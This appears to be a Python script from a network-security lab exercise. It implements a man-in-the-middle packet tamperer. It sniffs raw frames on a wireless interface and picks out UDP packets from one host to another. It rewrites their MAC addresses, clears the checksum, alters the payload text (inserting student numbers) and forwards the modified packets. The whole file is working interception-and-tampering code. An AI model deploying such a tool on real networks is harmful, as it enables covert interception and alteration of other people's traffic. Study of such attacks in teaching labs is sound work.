#!/usr/bin/env python3

import socket
import struct


HOST1_MAC = '00:0f:c9:0c:f7:8c'
HOST1_IP = '192.168.84.64'
HOST2_MAC = '00:0f:c9:0c:ee:ed'
HOST2_MAC_BYTES = [0x00, 0x0f, 0xc9, 0x0c, 0xee, 0xed]
HOST2_IP = '192.168.84.44'
MY_MAC = '3c:a9:f4:47:eb:c8'
MY_MAC_BYTES = [0x3c, 0xa9, 0xf4, 0x47, 0xeb, 0xc8]
MY_INTERFACE = 'wlo1'
SN1 = 's1010048XXXX'
SN2 = 's1013414YYYY'


def parse_ethernet(packet):
    (dest1, dest2, source1, source2, type_code) = struct.unpack('!IHHIH', packet[:14])
    data = packet[14:]

    if type_code == 0x8100:
        type_code = struct.unpack_from('!H', packet, 16)
        data = packet[18:]

    dest = (dest1 << 16) | dest2
    source = (source1 << 32) | source2
    dest_bytes = dest.to_bytes(6, byteorder='big')
    source_bytes = source.to_bytes(6, byteorder='big')
    dest_mac = ':'.join('{:02x}'.format(b) for b in dest_bytes)
    source_mac = ':'.join('{:02x}'.format(b) for b in source_bytes)

    return data, dest_mac, source_mac, type_code


def parse_ip(packet):
    header_length = (packet[0] & 0x0f) * 4
    header = packet[:header_length]
    data = packet[header_length:]

    (total_length, protocol, source_address, dest_address) = struct.unpack('!xxHxxxxxBxxII', header[:20])

    return header_length, header, data, total_length, protocol, source_address, dest_address


def parse_udp(packet):
    header_length = 8
    header = packet[:header_length]
    data = packet[header_length:]
    (source_port, dest_port, data_length, checksum) = struct.unpack('!HHHH', header)

    return source_port, dest_port, data_length, checksum, data


def patch_packet(packet, payload, dest_mac):
    new_packet = bytearray(packet)
    payload_offset = len(packet) - len(payload)

    # set dest mac to that of HOST2
    new_packet[0] = dest_mac[0]
    new_packet[1] = dest_mac[1]
    new_packet[2] = dest_mac[2]
    new_packet[3] = dest_mac[3]
    new_packet[4] = dest_mac[4]
    new_packet[5] = dest_mac[5]

    # set source mac to our mac
    new_packet[6] = MY_MAC_BYTES[0]
    new_packet[7] = MY_MAC_BYTES[1]
    new_packet[8] = MY_MAC_BYTES[2]
    new_packet[9] = MY_MAC_BYTES[3]
    new_packet[10] = MY_MAC_BYTES[4]
    new_packet[11] = MY_MAC_BYTES[5]

    # clear udp checksum
    new_packet[40] = 0
    new_packet[41] = 0

    # insert student numbers into payload
    payload_str = payload.decode('utf-8')
    payload_str = payload_str.replace('XXXXXXXXXXXX', SN1)
    payload_str = payload_str.replace('YYYYYYYYYYYY', SN2)
    new_payload = payload_str.encode('utf-8')
    new_packet[payload_offset:] = new_payload

    return new_packet


def main():
    # bind to wireless interface
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind((MY_INTERFACE, 0))

    while True:
        (packet, address) = s.recvfrom(65565)
        (ethernet_data, dest_mac, source_mac, type_code) = parse_ethernet(packet)

        if type_code == 0x800 and source_mac == HOST1_MAC and dest_mac == MY_MAC:
            (ip_header_length, ip_header, ip_data, total_length, protocol, source_address, dest_address) = parse_ip(ethernet_data)
            source_ip = socket.inet_ntoa(struct.pack('!I', source_address))
            dest_ip = socket.inet_ntoa(struct.pack('!I', dest_address))

            if protocol == 17 and source_ip == HOST1_IP and dest_ip == HOST2_IP:
                (source_port, dest_port, data_length, checksum, data) = parse_udp(ip_data)

                # Patch packet and then forward it to HOST2
                new_packet = patch_packet(packet, data, HOST2_MAC_BYTES)
                s.send(new_packet)

                print('[*] Forwarded packet from {} ({}) to {} ({})'.format(source_ip, source_mac, dest_ip, HOST2_MAC))

if __name__ == '__main__':
    main()
